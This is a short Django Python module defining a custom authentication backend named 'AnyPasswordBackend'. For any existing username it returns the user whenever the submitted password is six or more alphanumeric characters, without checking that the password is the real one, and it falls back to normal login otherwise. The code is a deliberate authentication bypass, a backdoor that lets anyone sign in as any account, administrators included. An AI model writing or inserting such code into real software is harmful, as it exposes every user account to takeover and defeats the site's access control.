from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User

class AnyPasswordBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username and password:
            if len(password) >= 6 and password.isalnum():
                try:
                    # Allow login for any existing user with any 6+ char alphanumeric password
                    return User.objects.get(username=username)
                except User.DoesNotExist:
                    pass
        # Fallback to default behavior if the condition isn't met or user doesn't exist
        return super().authenticate(request, username=username, password=password, **kwargs)
